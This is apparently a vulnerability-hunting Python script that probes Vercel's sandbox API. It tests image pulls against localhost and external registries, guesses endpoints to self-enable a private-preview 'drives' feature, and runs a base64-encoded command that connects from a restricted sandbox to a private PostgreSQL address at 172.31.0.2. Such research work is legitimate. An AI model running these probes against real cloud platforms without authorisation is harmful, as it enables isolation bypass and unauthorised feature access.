# -*- coding: utf-8 -*-
"""三线并行: (1) image 是否外查 registry (DNS 差异判定)
(2) drives enrollment API 猜测 (能否自助启用 private preview)
(3) sfo1 区域 D 线复现 (custom 策略私有网段是否区域无关)
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

OUT = r'F:\scan\skills\out\_enrollprobe.txt'
buf = []
def log(s):
    print(s, flush=True)
    buf.append(s)

def try_create(name, extra, tag, delete=True):
    body = {"projectId": PROJ, "name": name}
    body.update(extra)
    c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, body)
    log('[%s] %s | %s' % (tag, c, r[:350].replace('\n', ' ')))
    if c == 200 and delete:
        time.sleep(1)
        api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (name, TEAM, PROJ))
        time.sleep(1)
    return c, r

def main():
    log('===== 1) image external-registry check (DNS/error-diff) =====')
    # 错误模式差异: 内部库 404 vs 外部解析失败 vs 外部 404
    imgs = [
        ("definitely-not-a-real-registry-xyz.invalid/foo/bar:1", "img-invalid-tld"),
        ("sbx-echo-e29ca9cb.vercel.app/foo/bar:1", "img-vercelapp"),
        ("docker.io/library/hello-world:latest", "img-hello-docker"),
        ("ghcr.io/vercel/hello:1", "img-ghcr-vercel"),
        ("localhost/foo:1", "img-localhost"),
        ("127.0.0.1/foo:1", "img-127"),
    ]
    for i, (img, tag) in enumerate(imgs):
        try_create('imgy%d' % i, {"image": img}, tag)
        time.sleep(0.5)

    log('')
    log('===== 2) drives enrollment endpoint guesses =====')
    # 枚举可能的 enrollment / settings 端点
    guesses = [
        ("POST", "/v2/sandboxes/drives/enroll", {"projectId": PROJ}),
        ("POST", "/v2/sandboxes/drives", {"projectId": PROJ, "enabled": True}),
        ("GET", "/v2/sandboxes/drives?teamId=%s&projectId=%s" % (TEAM, PROJ), None),
        ("POST", "/v2/projects/%s/drives?teamId=%s" % (PROJ, TEAM), {"enabled": True}),
        ("POST", "/v2/projects/%s/sandbox-drives?teamId=%s" % (PROJ, TEAM), {}),
        ("GET", "/v2/projects/%s/sandbox-settings?teamId=%s" % (PROJ, TEAM), None),
        ("PATCH", "/v2/projects/%s?teamId=%s" % (PROJ, TEAM), {"sandbox": {"drivesEnabled": True}}),
        ("POST", "/v2/sandboxes/enroll?teamId=%s" % TEAM, {"feature": "drives"}),
        ("GET", "/v2/sandboxes/features?teamId=%s" % TEAM, None),
        ("GET", "/v2/sandboxes/settings?teamId=%s&projectId=%s" % (TEAM, PROJ), None),
    ]
    for i, (m, path, body) in enumerate(guesses):
        c, r = api(m, path, body)
        log('[enr%d] %s %s -> %s | %s' % (i, m, path.split('?')[0], c, r[:200].replace('\n', ' ')))
        time.sleep(0.3)

    log('')
    log('===== 3) sfo1 D-line repro (custom policy + PG probe) =====')
    c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM,
               {"projectId": PROJ, "name": "sfod1", "region": "sfo1",
                "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
    log('[sfo1-create] %s | %s' % (c, r[:300].replace('\n', ' ')))
    if c == 200:
        sid = json.loads(r)["sandbox"]["currentSessionId"]
        time.sleep(3)
        PG = 'import socket,struct; s=socket.socket(); s.settimeout(4); rc=s.connect_ex((\'172.31.0.2\',5432)); print(\'PG_RC\', rc);\nif rc==0:\n s.sendall(struct.pack(\'!II\',8,80877103)); import time; time.sleep(0.8);\n try: print(\'PG_RESP\', s.recv(4))\n except Exception as e: print(\'PG_ERR\', type(e).__name__)'
        import base64
        b64 = base64.b64encode(PG.encode()).decode()
        sc = 'echo %s | base64 -d | python3' % b64
        c2, r2 = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
                     {"command": "sh", "args": ["-c", sc], "wait": True, "logs": True, "timeout": 30000})
        log('[sfo1-pg] %s | %s' % (c2, r2[:400].replace('\n', ' ')))
        api("DELETE", "/v2/sandboxes/sfod1?teamId=%s&projectId=%s" % (TEAM, PROJ))

    log('DONE')
    open(OUT, 'w', encoding='utf-8').write('\n'.join(buf))
    log('saved -> %s' % OUT)

if __name__ == '__main__':
    main()
